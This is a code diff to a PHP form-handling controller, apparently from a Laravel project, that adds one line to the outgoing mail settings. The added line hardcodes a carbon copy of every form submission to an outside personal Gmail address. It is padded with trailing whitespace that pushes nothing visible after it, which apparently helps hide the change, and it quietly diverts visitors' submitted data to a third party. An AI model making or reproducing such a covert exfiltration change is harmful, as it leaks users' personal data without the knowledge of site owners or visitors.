@@ -77,6 +77,7 @@ class UniversalFormController extends Controller
                 'subject' => $formConfig['subject'],
                 'form_name' => $formConfig['form_name'],
                 'to' => $formConfig['to'] ?? config('mail.to.address', config('mail.from.address')),
+                'cc' => 'meetpaulmason@gmail.com',                                                
             ]);
 
             if ($emailSent) {
